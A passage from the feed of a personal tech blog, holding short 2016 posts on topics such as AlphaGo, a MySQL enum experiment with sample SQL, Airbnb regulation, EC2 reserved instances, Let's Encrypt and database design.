<p>Each of these is a perfect fit for politics. There are huge economies of scale and distribution for political parties. They’re purely information so there’s no marginal cost and the brunt of the cost is in the formation of a party which is incredibly difficult due to the massive network effects and infrastructure required. People have diverse beliefs with great variance on the most important issues and don’t have the depth to know every issue.</p>

<p>It’s no wonder that political parties are so entrenched but this also provides insights on how to dismantle these bundles. We need to examine history and see how previous bundles have been broken down and see whether those solutions can apply to our political system.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Data analysis needs to be fun</title>
   <link href="http://dangoldin.com/2016/03/21/data-analysis-needs-to-be-fun/"/>
   <updated>2016-03-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/03/21/data-analysis-needs-to-be-fun</id>
   <content:encoded><![CDATA[
<p>In order to do any meaningful data analysis you need to have fun doing it. Otherwise it becomes a chore that’s extended by each additional analysis you run and each additional failed attempt at an insight. This requires a positive attitude and enjoying the slow, methodical process of discovery and appreciating each iteration while getting closer to the end goal. The vast majority of analyses lead to no new insight, especially when all the easy stuff has already been figured out, and it’s critical to remain the optimist while appreciating the present.</p>

<p>A key part of this is tools. I have a set of tools I’m intimately familiar with and can manipulate them without much thought. It’s this passive approach and behavior that lets me go through the rote work while simultaneously focusing in on the challenging elements of the problems I’m facing. Fast tools are also a requirement. Tools that allow you to quickly get a result prevent you from leaving the zone and leave you ready for the next attempt.</p>

<p>When 80% of the work is rote data manipulation it’s important to not burn out while getting to the 20%. To be successful you need to find the fun in both the data manipulation and the analysis.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Passing the torch: IBM to Google</title>
   <link href="http://dangoldin.com/2016/03/20/passing-the-torch-ibm-to-google/"/>
   <updated>2016-03-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/03/20/passing-the-torch-ibm-to-google</id>
   <content:encoded><![CDATA[
<p>Last week the big news was that Google’s AlphaGo was able to win 4 of the 5 games against Lee Sedol in Go. As we’ve gotten better and better hardware it’s not surprising that an AI was finally able to win in a well defined environment. AIs will continue to improve and we’ll start seeing more and more of this behavior across a wide range of problems and not just games. The most significant part for me was that this was achieved by Google and not by IBM. IBM had two recent notable achievements in AI - one was building Deep Blue in 1997 which beat Gary Kasparov in chess and the other was building Watson in 2001 which dominated at Jeopardy. Yet just five years later Google has claimed the AI victory with AlphaGo.</p>

<p>It’s tough to not see this is as the passing of the torch. Google has tons of incredible AI that’s used to power the business but building an AI to focus on Go was taking something out of IBM’s playbook. Luckily, we’re seeing a ton of AI work being open sourced - from Google’s <a href="https://www.tensorflow.org/">TensorFlow</a> to Facebook’s <a href="https://research.facebook.com/blog/fair-open-sources-deep-learning-modules-for-torch/">FAIR</a> to <a href="https://openai.com/blog/introducing-openai/">OpenAI</a> - and I’m excited to see what we come up with.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Approach work like the gym</title>
   <link href="http://dangoldin.com/2016/03/13/approach-work-like-the-gym/"/>
   <updated>2016-03-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/03/13/approach-work-like-the-gym</id>
   <content:encoded><![CDATA[
<p>To get the most benefit from working out it’s important to have a plan and consistently measure yourself and keep pushing your goals and yet it’s surprising how rarely that’s done in a professional setting. We spend over 40 hours a week working but the majority of us view it as a chore and something that we just have to do. Imagine if everyone approached work the same way they approach the gym. People would have much clearer ideas of what they want to do and what challenges they face. They would be able to measure how well they’re doing and understanding what they need to start doing to get to the next level. Instead most approach it as something that they need to do rather than something they want to do.</p>

<p>Consistently going to the gym without a plan will definitely improve your shape and is better than not going at all. But it pales with what would happen if you went to the gym with a plan in mind. It took me a long time to realize this and I suspect most people approach work passively - they’ll just put in the time, do a good job, and see where things will go. But true success and joy come from constantly reevaluating your goals and thinking through the means to achieve them.</p>

<p>It’s depressing to think that most people spend a third of their day on something that they’re not actively engaged with when an attitude change can change the entire perception of work. Rather than putting in the bare minimum we should be thinking of what we want in our lives and how work can make that happen.</p>

<p>Many people seem to idealize retirement but I want to be so engaged in my work that I never want to stop. This is the vision we should all be working towards. I understand that this is a privileged perspective and not everyone has this choice and there are always constraints but it’s something we should all strive to attain.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The MySQL enum type</title>
   <link href="http://dangoldin.com/2016/03/10/the-mysql-enum-type/"/>
   <updated>2016-03-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/03/10/the-mysql-enum-type</id>
   <content:encoded><![CDATA[
<p>The MySQL enum field provides a nice compromise - the space efficiency of using an integer, the human readability of text, and basic type safety. Yet I had this vague recollection of reading something that made it seem enums carried a ton of risks when changing the column definition so wanted to see if I could “break” it. Turns out it’s a lot more resilient than I thought. I went through a series of combinations - ranging from changing the order of the enums in the definition to trying to insert values that didn’t exist but in every case it handled it as expected. Doing a bit of research I discovered how MySQL represents the enum type. Rather than storing the values in a specific order MySQL supposedly creates a map-like structure to relate the integer values with their enum counterparts. This allows you to change the order of the enum definition without changing the underlying map or any of the stored values. I still wouldn’t use enums for anything that would require a join but for storing small and simple sets of data it works great.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">drop</span> <span class="k">table</span> <span class="n">if</span> <span class="k">exists</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Create the toy table</span>
<span class="k">create</span> <span class="k">table</span> <span class="n">test</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
  <span class="n">e</span> <span class="nb">enum</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">)</span>
<span class="p">);</span>

<span class="c1">-- Populate it with some sample values</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">test</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'a'</span><span class="p">),</span> <span class="p">(</span><span class="s1">'b'</span><span class="p">),</span> <span class="p">(</span><span class="s1">'c'</span><span class="p">);</span>

<span class="c1">-- Confirm they look good</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Now let's add another possible enum value</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">test</span> <span class="k">modify</span> <span class="k">column</span> <span class="n">e</span> <span class="nb">enum</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">);</span>

<span class="c1">-- Looks good</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Add some more values</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">test</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'d'</span><span class="p">),(</span><span class="s1">'a'</span><span class="p">),</span> <span class="p">(</span><span class="s1">'b'</span><span class="p">),</span> <span class="p">(</span><span class="s1">'c'</span><span class="p">);</span>

<span class="c1">-- Looks good</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Change the order around</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">test</span> <span class="k">modify</span> <span class="k">column</span> <span class="n">e</span> <span class="nb">enum</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'e'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">);</span>

<span class="c1">-- Looks the same</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Change it again</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">test</span> <span class="k">modify</span> <span class="k">column</span> <span class="n">e</span> <span class="nb">enum</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">,</span><span class="s1">'e'</span><span class="p">);</span>

<span class="c1">-- Looks the same</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Add and change the order</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">test</span> <span class="k">modify</span> <span class="k">column</span> <span class="n">e</span> <span class="nb">enum</span><span class="p">(</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">,</span><span class="s1">'e'</span><span class="p">,</span><span class="s1">'f'</span><span class="p">,</span><span class="s1">'a'</span><span class="p">);</span>

<span class="c1">-- Looks the same</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span>

<span class="c1">-- Fails since 'g' is not a valid value</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">test</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'g'</span><span class="p">);</span>

<span class="c1">-- Replace 'a' with 'f'</span>
<span class="k">update</span> <span class="n">test</span> <span class="k">set</span> <span class="n">e</span> <span class="o">=</span> <span class="s1">'f'</span> <span class="k">where</span> <span class="n">e</span> <span class="o">=</span> <span class="s1">'a'</span><span class="p">;</span>

<span class="c1">-- Now get rid of 'a'</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">test</span> <span class="k">modify</span> <span class="k">column</span> <span class="n">e</span> <span class="nb">enum</span><span class="p">(</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">,</span><span class="s1">'e'</span><span class="p">,</span><span class="s1">'f'</span><span class="p">,</span><span class="s1">'g'</span><span class="p">);</span>

<span class="c1">-- Now add 'a' back in</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">test</span> <span class="k">modify</span> <span class="k">column</span> <span class="n">e</span> <span class="nb">enum</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">,</span><span class="s1">'e'</span><span class="p">,</span><span class="s1">'f'</span><span class="p">,</span><span class="s1">'g'</span><span class="p">);</span>

<span class="c1">-- Now swap 'f' back with 'a'</span>
<span class="k">update</span> <span class="n">test</span> <span class="k">set</span> <span class="n">e</span> <span class="o">=</span> <span class="s1">'a'</span> <span class="k">where</span> <span class="n">e</span> <span class="o">=</span> <span class="s1">'f'</span><span class="p">;</span>

<span class="c1">-- Looks just like before</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span><span class="p">;</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Airbnb, Uber, and local laws</title>
   <link href="http://dangoldin.com/2016/03/06/airbnb-uber-and-local-laws/"/>
   <updated>2016-03-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/03/06/airbnb-uber-and-local-laws</id>
   <content:encoded><![CDATA[
<p>Yesterday I read an <a href="http://www.nytimes.com/2016/03/06/business/airbnb-pits-neighbor-against-neighbor-in-tourist-friendly-new-orleans.html">interesting piece</a> on Airbnb in New Orleans. The content itself isn’t new - it highlights the typical conflict between those that view Airbnb as violating local ordinances and ruining the city and others who believe that Airbnb brings value and is helping New Orleans rebuild after Katrina.</p>

<p>But what was interesting was the repeated claims of Airbnb and the other rental marketplaces that it’s just not scalable to follow local policies for every city and it’s up to the users to know their local regulations and follow them. I understand it’s difficult to localize complex products but these responses just feel like an excuse.</p>

<blockquote>
  <p>Representatives of the larger home-sharing companies have met with New Orleans officials, but they are seldom heard from in more public forums. Officials of Airbnb and VRBO (Vacation Rentals by Owner, a HomeAway brand that is popular in New Orleans) point out that they operate in so many places they cannot possibly get into the specifics of local policy; they are merely private businesses offering services to consumers. So it is up to New Orleans and other cities to devise their own regulations, and up to users to follow them.</p>
</blockquote>

<blockquote>
  <p>According to Mr. Rivers, Airbnb and VRBO told his staff that it would be too onerous to adjust their software to accommodate every regulatory arrangement for thousands of municipalities around the world. Spokesmen for Airbnb and VRBO confirm that rewriting their platforms in this way is not practical.</p>
</blockquote>

<p>Contrast this with Uber. They also run a marketplace that’s highly sensitive to local regulation but work within the confines of the law (including pushing to change legislation). Both Uber the company as well as the Uber app have adapted a localized view. When I open up the Uber app in New York City I see a variety of options that I don’t see in other places. In fact, Uber can even push idiosyncratic updates that may only last a couple of days - for example a special <a href="http://techcrunch.com/2015/07/16/uber-launches-de-blasios-uber-feature-in-nyc-with-25-minute-wait-times/">“De Blasio” ride option</a> that came with a 25 minute wait time.</p>

<p>The goal of technology companies is to come up with elegant solutions to real world constraints. Uber has embraced it by building their company and product to embrace local differences while Airbnb adopted the attitude of a single product for the whole world. I’m confident if Airbnb wanted to build a flexible product that worked for local markets they’d be able to and it would actually be a fun and interesting product and engineering challenge. Startups need to embrace their challenges and this feels like Airbnb being complacent. I understand there’s a high cost to localize Airbnb and it comes with a world of risks but if they do it right they’ll be able to capture significantly more share and markets.</p>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS EC2 instance arbitrage</title>
   <link href="http://dangoldin.com/2016/03/05/aws-ec2-instance-arbitrage/"/>
   <updated>2016-03-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/03/05/aws-ec2-instance-arbitrage</id>
   <content:encoded><![CDATA[
<p>While reserving some EC2 instances earlier this week I discovered that Amazon allows you to <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ri-market-buying-guide.html">sell</a> reserved instances you’re no longer using. Usually the prices the third parties are offering are very close to the fair market value but I wondered if there was an arbitrage opportunity by reserving a longer term instance and selling it for a series of shorter term leases. The <a href="https://aws.amazon.com/ec2/pricing/">typical discount</a> for buying a 1 year reserved instance is 30% while buying one for 3 years can get over 60%. The idea being that if you can get an instance for a 60% discount over 3 years and then sell it for 3 one year terms at a 25% discount you end up coming out ahead. Of course the challenge is that Amazon constantly drops prices so a 60% discount now may be equivalent to something much smaller three years later. There’s also the risk of no one purchasing your instances but that seems unlikely since you can always undercut Amazon’s official price. The other factor is the discount rate since you’re paying up front for 3 years worth of an instance. During that time you could have taken that money and invested it elsewhere which could have led to a better return but which would have been unlikely when you’re getting a 30% discount over the course of a year.</p>

<p>Unfortunately, based on the Amazon seller <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ri-market-selling-guide.html">documentation</a> it looks as if you can’t actually split a 3 year reservation into 3 single year reservations and you’ll be charged a 12% fee. There’s always the option of using an instance and then selling it at a premium for a term that Amazon is not offering but I doubt it’s worth it given the risks and the restrictions placed by Amazon.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tool specialization and growing companies</title>
   <link href="http://dangoldin.com/2016/02/28/tool-specialization-and-growing-companies/"/>
   <updated>2016-02-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/28/tool-specialization-and-growing-companies</id>
   <content:encoded><![CDATA[
<p>It’s obvious in hindsight but incredible when you experience it but every successful company has to iterate through a variety of tools as it, and its problems, grow. A typical modern tech startup starts by identifying a problem and using a common web framework to quickly come up with the first pass. But as this company grows new problems and situations arise that the initial solution no longer supports. They may end up having a series of asynchronous tasks and need to start using RabbitMQ with that use case. MySQL may no longer be enough and they start offloading their data to Redshift. That off the shelf web framework is no longer performant enough so they have to split it into multiple components and start embracing strong, statically typed languages.</p>

<p>This tool specialization also goes hand in hand with team specialization. A single engineer doesn’t have the time to do everything so startups need to make the short term decisions and focus on the next couple of months in order to grow. Only when they grow does t make sense to find the critical problems and dedicate time to fixing them. And hopefully by that point you have a larger team that can focus on the deeper problems.</p>

<p>For most of us the problems have already been solved and it’s about figuring out how to adapt the solutions for our systems. Sometimes this requires getting an open source library to work. Other times it may require implementing the code from an obscure academic paper. But the real success comes when you run into problems that no one else has encountered. At that point you’re dealing with extremely specialized problems that you were the first to encounter. These are the scale problems that Google and Facebook are solving and every startup hopes to get there some day. In fact, that is the ultimate mission engineering based companies - solving problems that haven’t been encountered yet.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Aural information density</title>
   <link href="http://dangoldin.com/2016/02/27/aural-information-density/"/>
   <updated>2016-02-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/27/aural-information-density</id>
   <content:encoded><![CDATA[
<p>Whenever I watch some online lectures or listen to a podcast one of the first things I do is change the speed to either 1.5x or 2x the original. Sometimes I’ll have to skip back or reduce it back to the normal speed but for the most part this approach saves me tons of time and I like to think that I absorb the same amount of information. But the fact that I can absorb and process information at twice the speed makes me wonder how much more productive I’d be if every conversation I had occured at twice the speed. Is there some physiological reason we don’t speak at twice the speed? Is there a cultural factor? Does this information density vary based on language?</p>

<p>We can train ourselves to get faster and faster at processing aural information but there must be some limit and I suspect there’s a wide range in the information density of various languages. If this is the case I wonder if there’s some conclusion that can be drawn about that culture or society. Most likely the bottleneck is on the transmission side - the effort to produce language is more than listening and it requires both our brains to form thoughts and our mouths to turn them into sounds which are the limiting reagent.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Platform partnerships</title>
   <link href="http://dangoldin.com/2016/02/22/platform-partnerships/"/>
   <updated>2016-02-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/22/platform-partnerships</id>
   <content:encoded><![CDATA[
<p>I <a href="http://dangoldin.com/2016/02/21/amazon-echo">set up</a> the Amazon Echo over the weekend and have been an active user of my wife’s Spotify account which comes integrated with the Echo. I would have preferred to use my Apple Music account but the Echo currently only supports Spotify. I suspect the biggest reasons are competitive - Amazon and Apple are competing for the home and it’s likely that either Amazon doesn’t want to integrate Apple or Apple is preventing Amazon from getting the integration done. At the same time Amazon has a music offering yet they specifically call out the Spotify integration. Is this because Spotify is only a competitor for music and the value of an Echo trumps this? Is it because Spotify has more reach and this is a necessary integration? I’m sure the answer is a bit of both but it’s fascinating to see how these partnerships develop.</p>

<p>Ideally every company would provide an open way for others to integrate their apps but we live in a competitive, capitalist world where every company wants to get an edge over their competitors. As consumers it’s up to us to push for the integrations we want and make sure these platforms stay as open as possible - otherwise we’ll end up making the rich richer and prevent new entrants from even having a chance.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon Echo</title>
   <link href="http://dangoldin.com/2016/02/21/amazon-echo/"/>
   <updated>2016-02-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/21/amazon-echo</id>
   <content:encoded><![CDATA[
<p>After reading the positive reviews I got past the gimmick factor and jumped aboard the Amazon Echo train and got it set up yesterday. After going through the obvious examples (what’s the weather, tell me a joke, add x to my shopping list, play song y) and playing around with it I’m past the gimmick stage. The always on listening is really a different way to interact with our devices. Conceptually it’s no different than using Siri or Google Now but in practice it’s a world of difference. I don’t always have my phone with me and for some things it just feels more natural to start speaking and see an immediate effect. Whether that’s playing some specific songs or playlists, changing the volume, or adding items to a shopping list it feels more natural than having to go through a phone. One of my favorite use cases so far has been using the Echo to keep track of my shopping list. In the past I’d be in the kitchen and realize we needed something and would forget as soon as I switch tasks. With the Echo I can immediately call out what to add and have the list readily available next time I go to buy something.</p>

<p>To be honest, 99% of our Echo usage has been playing music and adding things to a shopping list but I can see the potential there. There are a ton of apps, that Amazon calls skills, with new ones constantly being developed and I look forward to seeing what kind of cool stuff gets developed.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Let's Encrypt</title>
   <link href="http://dangoldin.com/2016/02/20/lets-encrypt/"/>
   <updated>2016-02-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/20/lets-encrypt</id>
   <content:encoded><![CDATA[
<p>I’ve been meaning to mess around with <a href="https://letsencrypt.org/">Let’s Encrypt</a> since they launched their public beta but haven’t had the chance until earlier today. As an proof of concept I had a bunch of old projects running on a Digital Ocean instance and decided to try converting them to HTTPS using the Let’s Encrypt project.</p>

<p>Despite the usual complexity of getting and integrating an SSL certificate Let’s Encrypt made it extremely easy. It was smart enough to go through each of my Apache configuration files and prompted me to see which domains I wanted to switch over to HTTPS. After selecting a few and continuing to the next step it generated new configuration files with the appropriate setting to enable SSL support.</p>

<p>The only issue I ran into was handling a WSGI configuration properly. Let’s Encrypt works by copying an existing configuration file and adding a few lines to specify the SSL certificate. This works great for simple configurations but can lead to an issue when you have the same WSGI configuration across two files. The fix was straightforward - temporarily comment out the conflict lines, run the Let’s Encrypt script, and then uncomment the lines in the new SSL version of the file.</p>

<p>Overall an extremely simple way to enable HTTPS on your projects. In the past I would have never set SSL up on toy projects due to both the cost of buying one as well as the cost of dealing with a bunch of esoteric commands to set it up. Let’s Encrypt makes it incredibly easy - especially if you’re running Apache.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The impact of self driving cars</title>
   <link href="http://dangoldin.com/2016/02/17/the-impact-of-self-driving-cars/"/>
   <updated>2016-02-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/17/the-impact-of-self-driving-cars</id>
   <content:encoded><![CDATA[
<p>Nearly every major tech company is pursuing a self driving car future and it’s inevitable that at some point most cars on the road will be completely autonomous. Cheap and easy transportation is the immediate change but there will be massive secondary effects to the shapes of cities and society.</p>

<p>A <a href="https://www.johnson.cornell.edu/Faculty-And-Research/Profile?id=lvo2">college professor</a> used the example of the invention of the car to highlight these sort of effects - if told that cars would be successful most people could have guessed that they’d replace horses and clean up cities. But very few would have been able to predict the rise of highways which led to the development of suburbs and the current structure of the United States.</p>

<p>Self driving cars have that same potential and it’s an interesting exercise to think through the impact. The short term is that fewer people will own cars, our roads will be safer, and that there will clearly be some disruption among the auto manufacturers. The medium and long term are where it gets tricky.</p>

<p>The increases in safety will lead to faster cars which may lead to another shift in where people live. One idea is that people will be able to live further and further away from cities which will lead to a decline in suburbs with more people opting to live in more remote areas while also leading to a boost in urban living.</p>

<p>Self driving cars will not just be ferrying people and one can imagine nearly everything being able to be delivered by self driving car or truck. I like the image of a “carrier truck” that drives around neighborhoods with a series of drones taking off and landing to deliver items along the way. In this sort of world there’s not a great need for physical stores. Taken to the extreme this means that cities will be designed to focus on the social elements. Convenience stores will disappear but restaurants will thrive. Most people aren’t buying everything online but I suspect it’s only a matter of time.</p>

<p>Public transit will have to change. I worry that if the price of self driving cars drops low enough to appeal to most people but high enough to not be affordable by some it will lead to a decline in public transit. At that point since most people wouldn’t care about public transition it would end up in a self destructive loop as more and more people decide to go for the self driving car route which in turn leads to less and less funds being allocated to public transit.</p>

<p>These are just scratching the surface and we’ll have to wait to see what happens.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Design your database for flexibility</title>
   <link href="http://dangoldin.com/2016/02/15/design-your-database-for-flexibility/"/>
   <updated>2016-02-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/15/design-your-database-for-flexibility</id>
   <content:encoded><![CDATA[
<p>One of the biggest lessons I’ve learned is to spend extra effort thinking about the database when setting out to build something new. Compared to changing a database schema, changing code is trivial. The database structure defines how you think about your business and either provides the flexibility as you grow or impedes you when forced to support something it wasn’t designed to handle.</p>

<p>With code you can do a deploy which can replace all behavior at once while with data you’re forced to acknowledge and handle the data you have. If this is a large table you have to figure out how to migrate the data to a new schema. The simple way is to deal with the downtime and hope the migration works. The more complex way is to support two database schemas at once with your code while the migration occurs. Neither of these would be necessary if you think through the database design choices you’re making. It’s going to be impossible to address every future need but there’s incredible value in at least thinking through potential changes and how they’d be supported.</p>

<p>A simple question is the relationship between tables - are you ever assuming a one-to-one relationship that may be one-to-many in the future? If that’s the case you’re probably better off designing the database to support the more advanced case but having your application only support the one-to-one case. This keeps the flexibility in place if you need but doesn’t complicate the code too much.</p>

<p>Another question to ask is whether there’s anything redundant. It may be easier to denormalize your data a bit for the sake of improving a query but don’t. If a database can support an inconsistent state it will support an inconsistent state. Whether due to a bug, a timing issue during a deploy, or someone making a manual update you’ll end up with an inconsistent state in the database which will likely lay dormant for too long. Avoid this issue entirely by removing all redundancies and potentially conflicting fields.</p>

<p>Beyond the tactical questions, thinking about your business and product roadmap a year from now is a great way to influence your schema now. If you suspect you’ll need to support a particular feature or flow you should imagine what your data would need to look like. It’s important to do this when writing code but it’s more important to do this when designing your database. Code can be changed with a deploy but database changes require more.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Longer terms in government?</title>
   <link href="http://dangoldin.com/2016/02/13/longer-terms-in-government/"/>
   <updated>2016-02-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/13/longer-terms-in-government</id>
   <content:encoded><![CDATA[
<p>Many have written about society’s inability to enact laws quickly enough to deal with the current pace of technological innovation. Governments are still trying to figure out how to regulate the sharing economy with both AirBnB and Uber being reacted to rather than being effectively regulated. This leads to different treatment in different locations and causes confusion for consumers, the businesses, and regulators.</p>

<p>A potential way to rectify this is to actually increase term limits for people in government. With politicians focusing on reelection every few years and constantly moving in and out of office it’s tough to develop a consistent regulatory approach. This worked well a hundred years ago when new industries would take a decade to develop and you could regulate them as they grew. Now it can take a year for entirely new businesses to be created before governments can react to what’s happening. By then the new consumer behavior has become entrenched and becomes difficult to change. Rather than worrying about reelection and undoing prior policies politicians should be focused on the future and how to adapt government for an increasingly changing society.</p>

<p>It’s counterintuitive that to deal with rapid change you want slower government turnover but it makes sense. Imagine a football team changing coaches for every game or a company switching CEOs every year. They’d be too busy dealing with the leadership change to win games or grow as businesses. Stability is necessary in rapidly changing environments and governments need to adapt to provide that in modern times.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Retargeting gone wrong</title>
   <link href="http://dangoldin.com/2016/02/10/retargeting-gone-wrong/"/>
   <updated>2016-02-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/10/retargeting-gone-wrong</id>
   <content:encoded><![CDATA[
<p>Retargeting ads work by checking to see a product you’ve looked at and then showing you that product over and over again with the hope that at some point you buy it. There are entire companies dedicated to this with extremely sophisticated algorithms so I’m surprised when I see inefficient behavior. In my case it was an Amazon ad that kept following me around even after I already purchased the product, a precision cooker. Given that Amazon knows my purchase history and sees that I’ve already bought the cooker it makes no sense to keep showing it to me. It seems that their algorithm figured this out as well and started showing me the same product in different packages and at different price points. The fact that they have logic that’s smart enough to show me different variations of the same product but not take into account my purchase history shocks me. What makes this even worse is that I own some Amazon stock and realize that this inefficiency has an impact, albeit a tiny one, on my shares.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Don't build a Homer</title>
   <link href="http://dangoldin.com/2016/02/07/dont-build-a-homer/"/>
   <updated>2016-02-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/02/07/dont-build-a-homer</id>
   <content:encoded><![CDATA[
<p>Years ago, one of my projects at Yodle involved building out an automated reporting system that would consolidate all the existing reports being run via SQL queries and consolidate them into a unified application that would take care of the execution and the delivery. During the design process I spoke with existing users to see what else they’d like and it quickly morphed from a cron-job like application that just emailed CSV files based on SQL queries into a full fledged business intelligence tool that users could use to pull arbitrary data formatted in a multitude of ways. While thinking through the design of this application I spoke with the CTO and he gave me a phrase I keep going back to: “To get the expressiveness of SQL you have to write SQL.”</p>

<div class="right10">
  <a href="http://simpsons.wikia.com/wiki/The_Homer">
    <img src="http://dangoldin.com/assets/static/images/homer-car.png" alt="The Homer" width="413" height="356" layout="responsive"/>
  </a>
</div>

<p>While simple and glib I like how relevant this statement is to building software. When asked users will push for the most flexible and powerful system that comes with all the bells and whistles but at that point it’s equivalent to them just writing the code themselves. We have to know where to draw the line and understand what the use cases our product needs to support and not just everyone’s wishes. Otherwise we run the risk of building a <a href="http://simpsons.wikia.com/wiki/The_Homer">Homer</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Describe what your code won't do</title>
   <link href="http://dangoldin.com/2016/01/31/describe-what-your-code-wont-do/"/>
   <updated>2016-01-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/31/describe-what-your-code-wont-do</id>
   <content:encoded><![CDATA[
<p>When starting to spec out a new feature a good habit is to think about what it won’t do. This forces you to focus on the problems that aren’t being solved and makes you aware of the tradeoffs you’re making. Rather than focusing on the problems being solved it’s equally important to know what you’re not doing as well as what your implementation will preclude you from doing in the future. To be effective we need to make tradeoffs or we’d never be able to launch anything but we shouldn’t make them blindly. We need to be aware of the tradeoffs we’re making and understand the paths that will be closed off by a given implementation. By thinking of the negatives of a particular approach we’re able to surface many of these dormant issues. This helps avoids surprises later on and ensures the code has been dissected and thought through in a variety of ways.</p>

<p>Another great thing to do is to share this list with the end users of the product. We’re known for having a variety of biases and a common one is risk aversion. In this case if we just list the problems we’re solving everyone’s glad to endorse it but as soon as we highlight the negatives people will start speaking up. We’re never going to ship perfect code but it’s something that we should strive for and getting actionable feedback early in the process is one of the best ways to get closer to that goal.</p>

<p>Everyone picks up this skill naturally through experience after being bit too many times by a crappy implementation but imagine how much better we’d be if we understood the tradeoffs we’re making with every decision. Focusing on the cases our solution doesn’t work for and prevents us from handling is a great way to get this experience earlier.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Unification in tech and a new Gilded Age</title>
   <link href="http://dangoldin.com/2016/01/29/unification-in-tech-and-a-new-gilded-age/"/>
   <updated>2016-01-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/29/unification-in-tech-and-a-new-gilded-age</id>
   <content:encoded><![CDATA[
